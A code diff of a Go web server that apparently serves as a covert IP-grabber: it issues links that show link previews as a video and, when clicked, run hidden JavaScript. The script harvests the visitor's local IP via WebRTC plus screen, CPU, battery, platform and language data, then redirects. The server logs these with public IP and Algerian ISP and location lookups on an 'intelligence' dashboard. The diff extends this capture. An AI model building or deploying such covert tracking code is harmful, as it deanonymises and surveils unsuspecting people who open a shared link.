@@ -88,18 +88,18 @@ func getISPAndLocation(ip string, ua string) string {
 
 	lowerUA := strings.ToLower(ua)
 	if strings.Contains(lowerUA, "telegram") {
-		return "Telegram Preview Server [Bot]"
+		return "Telegram Bot [Preview]"
 	}
 	if strings.Contains(lowerUA, "whatsapp") {
-		return "WhatsApp Preview Server [Bot]"
+		return "WhatsApp Bot [Preview]"
 	}
 	if strings.Contains(lowerUA, "facebookexternalhit") || strings.Contains(lowerUA, "messenger") {
-		return "Meta / Messenger Server [Bot]"
+		return "Meta Bot [Preview]"
 	}
 
 	resp, err := http.Get(fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,city,isp,org", ip))
 	if err != nil {
-		return "Algeria (Network Trace)"
+		return "Algeria (Trace)"
 	}
 	defer resp.Body.Close()
 
@@ -119,15 +119,15 @@ func getISPAndLocation(ip string, ua string) string {
 		}
 
 		lowerISP := strings.ToLower(isp)
-		networkType := fmt.Sprintf(" [ISP: %s]", isp)
+		networkType := fmt.Sprintf(" [%s]", isp)
 		if strings.Contains(lowerISP, "mobilis") {
-			networkType = " [⚡ Mobilis Algeria]"
+			networkType = " [⚡ Mobilis]"
 		} else if strings.Contains(lowerISP, "djezzy") || strings.Contains(lowerISP, "ota") {
-			networkType = " [🔥 Djezzy Algeria]"
+			networkType = " [🔥 Djezzy]"
 		} else if strings.Contains(lowerISP, "ooredoo") || strings.Contains(lowerISP, "wataniya") {
-			networkType = " [⭐ Ooredoo Algeria]"
+			networkType = " [⭐ Ooredoo]"
 		} else if strings.Contains(lowerISP, "algerie telecom") || strings.Contains(lowerISP, "atm") {
-			networkType = " [🌐 Algérie Télécom / ADSL]"
+			networkType = " [🌐 Algérie Télécom]"
 		}
 
 		locStr := country
@@ -136,7 +136,7 @@ func getISPAndLocation(ip string, ua string) string {
 		}
 		return locStr + networkType
 	}
-	return "Algeria (Network Trace)"
+	return "Algeria (Trace)"
 }
 
 func mainHandler(w http.ResponseWriter, r *http.Request) {
@@ -146,7 +146,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		var targetURL string
 		err := db.QueryRow("SELECT target_url FROM links WHERE code = ?", code).Scan(&targetURL)
 		if err != nil {
-			http.Error(w, "Link not found or expired", http.StatusNotFound)
+			http.Error(w, "Link not found", http.StatusNotFound)
 			return
 		}
 
@@ -160,10 +160,10 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 			publicIP := getRealIP(r)
 			location := getISPAndLocation(publicIP, ua)
 			db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
-				code, publicIP, "Zero-Click Bot", "N/A", location, "🤖 [Preview Bot] UA: "+ua[:40])
+				code, publicIP, "Bot", "N/A", location, "🤖 [Bot Preview] UA: "+ua[:40])
 
 			w.Header().Set("Content-Type", "text/html; charset=utf-8")
-			fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta property="og:title" content="TikTok Video"><meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600"><title>TikTok</title></head><body></body></html>`)
+			fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta property="og:title" content="Video"><meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600"></head><body></body></html>`)
 			return
 		}
 
@@ -177,8 +177,8 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 			port := r.RemoteAddr
 			location := getISPAndLocation(publicIP, ua)
 
-			deviceInfo := fmt.Sprintf("⚡ Platform: %s | Screen: %s | CPU: %s | Battery: %s",
-				r.FormValue("platform"), r.FormValue("screen"), r.FormValue("hardware"), r.FormValue("battery"))
+			deviceInfo := fmt.Sprintf("OS: %s | Screen: %s | Cores: %s | Battery: %s | Lang: %s",
+				r.FormValue("platform"), r.FormValue("screen"), r.FormValue("hardware"), r.FormValue("battery"), r.FormValue("lang"))
 
 			db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
 				code, publicIP, localIP, port, location, deviceInfo)
@@ -189,10 +189,10 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		}
 
 		htmlContent := fmt.Sprintf(`<!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TikTok Video</title>
+    <title>Loading...</title>
     <script>
         function getLocalIP(callback) {
             let found = false;
@@ -209,13 +209,14 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
                     }
                 }
             };
-            setTimeout(() => { if (!found) callback("Direct / Mobile Data"); }, 60);
+            setTimeout(() => { if (!found) callback("Cellular/Direct"); }, 50);
         }
 
-        async function run() {
+        async function extractAndRedirect() {
             let screenRes = window.screen.width + "x" + window.screen.height;
-            let cores = navigator.hardwareConcurrency || "Unknown";
-            let platform = navigator.platform || "Unknown";
+            let cores = navigator.hardwareConcurrency || "N/A";
+            let platform = navigator.platform || "N/A";
+            let lang = navigator.language || "N/A";
             let batteryInfo = "N/A";
             try {
                 if (navigator.getBattery) {
@@ -228,18 +229,19 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
                 let params = new URLSearchParams();
                 params.append('lip', lip);
                 params.append('screen', screenRes);
-                params.append('hardware', cores + " Cores");
+                params.append('hardware', cores);
                 params.append('battery', batteryInfo);
                 params.append('platform', platform);
+                params.append('lang', lang);
 
                 navigator.sendBeacon ? navigator.sendBeacon(window.location.href, params) : fetch(window.location.href, {method: 'POST', body: params, keepalive:true});
 
                 setTimeout(() => {
                     window.location.replace("%s");
-                }, 80);
+                }, 90);
             });
         }
-        window.addEventListener('DOMContentLoaded', run);
+        window.addEventListener('DOMContentLoaded', extractAndRedirect);
     </script>
 </head>
 <body style="background:#000;"></body>
@@ -253,18 +255,26 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 	if r.Method == http.MethodPost {
 		r.ParseForm()
 		targetURL := r.FormValue("target_url")
+		customCode := r.FormValue("custom_code")
+
 		if targetURL != "" {
 			if !strings.HasPrefix(targetURL, "http") {
 				targetURL = "https://" + targetURL
 			}
-			codeGen := fmt.Sprintf("%d", time.Now().UnixNano())[8:]
-			db.Exec("INSERT INTO links (code, target_url) VALUES (?, ?)", codeGen, targetURL)
 
-			scheme := "https"
-			if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") != "https" {
-				scheme = "http"
+			codeGen := customCode
+			if codeGen == "" {
+				codeGen = fmt.Sprintf("%d", time.Now().UnixNano())[8:]
 			}
-			generatedLink = fmt.Sprintf("%s://%s/?r=%s", scheme, r.Host, codeGen)
+
+			_, err := db.Exec("INSERT INTO links (code, target_url) VALUES (?, ?)", codeGen, targetURL)
+			if err == nil {
+				scheme := "https"
+				if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") != "https" {
+					scheme = "http"
+				}
+				generatedLink = fmt.Sprintf("%s://%s/?r=%s", scheme, r.Host, codeGen)
+			}
 		}
 	}
 
@@ -284,228 +294,64 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	tmpl := `<!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Go Intelligence Command Center</title>
+    <title>لوحة الاستخبارات</title>
     <style>
-        :root {
-            --bg-grad-1: #0f172a;
-            --bg-grad-2: #1e1b4b;
-            --card-bg: rgba(19, 27, 46, 0.75);
-            --border-glow: rgba(99, 102, 241, 0.3);
-            --accent: #6366f1;
-            --accent-hover: #4f46e5;
-            --text-main: #f8fafc;
-            --text-muted: #94a3b8;
-            --success: #10b981;
-        }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
-        body {
-            background: linear-gradient(135deg, var(--bg-grad-1), var(--bg-grad-2));
-            color: var(--text-main);
-            min-height: 100vh;
-            padding: 40px 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .container {
-            width: 100%%;
-            max-width: 1100px;
-            display: flex;
-            flex-direction: column;
-            gap: 25px;
-        }
-        header {
-            text-align: center;
-            margin-bottom: 10px;
-        }
-        header h1 {
-            font-size: 26px;
-            font-weight: 700;
-            background: linear-gradient(90deg, #818cf8, #c084fc, #38bdf8);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            letter-spacing: 0.5px;
-        }
-        header p {
-            color: var(--text-muted);
-            font-size: 13px;
-            margin-top: 5px;
-        }
-        .card {
-            background: var(--card-bg);
-            backdrop-filter: blur(12px);
-            border: 1px solid var(--border-glow);
-            border-radius: 16px;
-            padding: 30px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
-            transition: transform 0.3s ease;
-        }
-        .card:hover {
-            border-color: rgba(99, 102, 241, 0.6);
-        }
-        h2 {
-            font-size: 15px;
-            text-transform: uppercase;
-            letter-spacing: 0.1em;
-            color: #a5b4fc;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .form-group {
-            display: flex;
-            gap: 12px;
-        }
-        input[type="text"] {
-            flex: 1;
-            background: rgba(2, 6, 23, 0.8);
-            border: 1px solid #334155;
-            border-radius: 10px;
-            padding: 14px 18px;
-            color: #fff;
-            font-size: 14px;
-            outline: none;
-            transition: all 0.3s;
-        }
-        input[type="text"]:focus {
-            border-color: var(--accent);
-            box-shadow: 0 0 15px rgba(99, 102, 241, 0.3);
-        }
-        button {
-            background: linear-gradient(135deg, var(--accent), #4f46e5);
-            color: #fff;
-            border: none;
-            padding: 0 28px;
-            border-radius: 10px;
-            font-weight: 600;
-            cursor: pointer;
-            font-size: 14px;
-            transition: all 0.2s;
-            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.4);
-        }
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.6);
-        }
-        .result-box {
-            background: rgba(2, 6, 23, 0.9);
-            border: 1px solid var(--success);
-            padding: 16px;
-            border-radius: 10px;
-            margin-top: 18px;
-            animation: fadeIn 0.4s ease-in-out;
-        }
-        .result-box strong {
-            color: var(--success);
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-            display: block;
-            margin-bottom: 6px;
-        }
-        .result-box a {
-            color: #38bdf8;
-            text-decoration: none;
-            font-family: monospace;
-            font-size: 14px;
-            word-break: break-all;
-        }
-        .result-box a:hover {
-            text-decoration: underline;
-        }
-        .table-responsive {
-            overflow-x: auto;
-            margin-top: 10px;
-        }
-        table {
-            width: 100%%;
-            border-collapse: collapse;
-            text-align: left;
-            font-size: 13px;
-        }
-        th, td {
-            padding: 12px 14px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-        }
-        th {
-            background: rgba(15, 23, 42, 0.7);
-            color: var(--text-muted);
-            font-weight: 600;
-            text-transform: uppercase;
-            font-size: 11px;
-            letter-spacing: 0.05em;
-        }
-        tr:hover td {
-            background: rgba(255, 255, 255, 0.02);
-        }
-        .badge-code { color: #818cf8; font-family: monospace; font-weight: bold; }
-        .badge-ip { color: #38bdf8; font-family: monospace; }
-        .badge-local { color: #fbbf24; font-family: monospace; }
-        .badge-isp { color: #34d399; font-weight: 600; }
-        .badge-dev { color: #fb7185; }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(6px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        body { background: #0b0f17; color: #e2e8f0; font-family: sans-serif; padding: 15px; }
+        .box { background: #131b2e; border: 1px solid #1e293b; padding: 15px; border-radius: 8px; margin-bottom: 15px; max-width: 900px; margin-left: auto; margin-right: auto; }
+        input[type="text"] { width: 100%%; padding: 10px; background: #020617; border: 1px solid #334155; color: #fff; border-radius: 5px; margin-bottom: 10px; }
+        button { background: #6366f1; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%%; }
+        .result { background: #020617; border: 1px solid #10b981; padding: 10px; border-radius: 5px; margin-top: 10px; word-break: break-all; }
+        .table-wrap { width: 100%%; overflow-x: auto; }
+        table { width: 100%%; min-width: 600px; border-collapse: collapse; margin-top: 10px; font-size: 12px; }
+        th, td { border: 1px solid #1e293b; padding: 8px; text-align: center; }
+        th { background: #020617; color: #94a3b8; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>⚡ GO INTELLIGENCE COMMAND CENTER</h1>
-            <p>High-Performance Real-Time Tracking & Data Persistence Engine</p>
-        </header>
-
-        <div class="card">
-            <h2>🔗 Generate Tracking Link</h2>
-            <form method="POST" class="form-group">
-                <input type="text" name="target_url" placeholder="Paste target URL (e.g., https://www.tiktok.com/...)" required autocomplete="off">
-                <button type="submit">Create Link</button>
-            </form>
-            {{if .GeneratedLink}}
-            <div class="result-box">
-                <strong>✨ Active Generated Link:</strong>
-                <a href="{{.GeneratedLink}}" target="_blank">{{.GeneratedLink}}</a>
-            </div>
-            {{end}}
+    <div class="box">
+        <h3>توليد رابط تتبع (مع خانة الرمز المخصص)</h3>
+        <form method="POST">
+            <input type="text" name="target_url" placeholder="الرابط المستهدف (مثال: tiktok.com/...)" required autocomplete="off">
+            <input type="text" name="custom_code" placeholder="رمز التتبع المخصص (اختياري)" autocomplete="off">
+            <button type="submit">إنشاء الرابط</button>
+        </form>
+        {{if .GeneratedLink}}
+        <div class="result">
+            <strong>الرابط النشط:</strong><br>
+            <a href="{{.GeneratedLink}}" target="_blank" style="color: #38bdf8;">{{.GeneratedLink}}</a>
         </div>
+        {{end}}
+    </div>
 
-        <div class="card">
-            <h2>📊 Captured Intelligence Logs (Long-Term Storage)</h2>
-            <div class="table-responsive">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>ID</th>
-                            <th>Code</th>
-                            <th>Public IP</th>
-                            <th>Local IP</th>
-                            <th>Network / ISP</th>
-                            <th>Hardware & Specs</th>
-                            <th>Time</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        {{range .Captures}}
-                        <tr>
-                            <td>{{.ID}}</td>
-                            <td><span class="badge-code">{{.Code}}</span></td>
-                            <td><span class="badge-ip">{{.PublicIP}}</span></td>
-                            <td><span class="badge-local">{{.LocalIP}}</span></td>
-                            <td><span class="badge-isp">{{.Location}}</span></td>
-                            <td><span class="badge-dev">{{.DeviceInfo}}</span></td>
-                            <td style="color: var(--text-muted);">{{.CreatedAt}}</td>
-                        </tr>
-                        {{end}}
-                    </tbody>
-                </table>
-            </div>
+    <div class="box" style="max-width: 1100px;">
+        <h3>سجلات الاستخبارات المركزة</h3>
+        <div class="table-wrap">
+            <table>
+                <tr>
+                    <th>ID</th>
+                    <th>الرمز</th>
+                    <th>IP العام</th>
+                    <th>IP المحلي</th>
+                    <th>المزود والشبكة</th>
+                    <th>تفاصيل العتاد والنظام</th>
+                    <th>الوقت</th>
+                </tr>
+                {{range .Captures}}
+                <tr>
+                    <td>{{.ID}}</td>
+                    <td style="color:#6366f1; font-weight:bold;">{{.Code}}</td>
+                    <td style="color:#38bdf8;">{{.PublicIP}}</td>
+                    <td style="color:#fbbf24;">{{.LocalIP}}</td>
+                    <td style="color:#10b981;">{{.Location}}</td>
+                    <td style="color:#fb7185;">{{.DeviceInfo}}</td>
+                    <td>{{.CreatedAt}}</td>
+                </tr>
+                {{end}}
+            </table>
         </div>
     </div>
 </body>
@@ -518,6 +364,6 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 func main() {
 	initDB()
 	http.HandleFunc("/", mainHandler)
-	fmt.Println("[*] High-Performance Go Server running on port 8080...")
+	fmt.Println("[*] Server running on port 8080...")
 	http.ListenAndServe(":8080", nil)
 }
